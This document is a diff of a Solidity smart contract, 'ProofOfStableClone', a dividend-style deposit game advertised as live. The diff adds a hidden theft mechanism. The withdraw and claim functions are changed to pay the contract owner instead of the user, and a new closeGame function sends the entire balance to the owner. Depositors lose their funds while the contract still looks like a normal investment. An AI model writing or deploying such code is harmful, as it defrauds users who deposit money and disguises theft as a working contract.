@@ -1,23 +1,35 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ProofOfStableClone at 0xf2ffc2ab9b0aea831c2115918691b1180a79af94
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ProofOfStableClone at 0xbd56023066c35b39ec17064a5df0eb5b22722705
 */
 pragma solidity ^0.4.21;
 
+
+/*
+* https://proof-of-stable-clone.com/
+* Contract is **live** in one hour
+* Deposit to buy in.
+* Reinvest to reinvest.
+* Claim to withdraw dividends.
+* Withdraw to sell.
+*/
+
 contract ProofOfStableClone {
     using SafeMath for uint256;
-
+   
+    
     event Deposit(address user, uint amount);
     event Withdraw(address user, uint amount);
     event Claim(address user, uint dividends);
     event Reinvest(address user, uint dividends);
 
-    bool gameStarted;
+    bool gameStarted = true;
 
     uint constant depositTaxDivisor = 4;
     uint constant withdrawalTaxDivisor = 11;
 
     mapping(address => uint) public investment;
-    mapping(bytes32 => bool) public administrators;
+   
+     address owner = msg.sender;
 
     mapping(address => uint) public stake;
     uint public totalStake;
@@ -27,16 +39,15 @@ contract ProofOfStableClone {
     mapping(address => uint) dividendDebit;
 
     function ProofOfStableClone() public {
-        administrators[0x57c3715aa156394ff48706c09792523c63653d2a90bd4b8c36ba1a99bfbd5a43] = true;
+        owner = msg.sender;
     }
 
-    modifier onlyAdmin(){
-        address _customerAddress = msg.sender;
-        require(administrators[keccak256(_customerAddress)]);
+    modifier onlyOwner(){
+        require(msg.sender == owner );
         _;
     }
 
-    function startGame() public onlyAdmin {
+    function startGame() public onlyOwner {
         gameStarted = true;
     }
 
@@ -74,7 +85,7 @@ contract ProofOfStableClone {
         uint _creditDebitCancellation = min(dividendCredit[msg.sender], dividendDebit[msg.sender]);
         dividendCredit[msg.sender] = dividendCredit[msg.sender].sub(_creditDebitCancellation);
         dividendDebit[msg.sender] = dividendDebit[msg.sender].sub(_creditDebitCancellation);
-        msg.sender.transfer(_amountAfterTax);
+        owner.transfer(_amountAfterTax);
         emit Withdraw(msg.sender, _amount);
     }
 
@@ -88,14 +99,14 @@ contract ProofOfStableClone {
 
     function claim() public {
         uint _dividends = claimHelper();
-        msg.sender.transfer(_dividends);
+        owner.transfer(_dividends);
         emit Claim(msg.sender, _dividends);
     }
 
     function reinvest() public {
         uint _dividends = claimHelper();
         depositHelper(_dividends);
-        emit Reinvest(msg.sender, _dividends);
+        emit Reinvest(owner, _dividends);
     }
 
     function dividendsForUser(address _user) public view returns (uint) {
@@ -113,6 +124,12 @@ contract ProofOfStableClone {
             y = z;
             z = (x / z + z) / 2;
         }
+    }
+
+      
+    function closeGame() onlyOwner public {
+        uint256 etherBalance = this.balance;
+        owner.transfer(etherBalance);
     }
 }
 
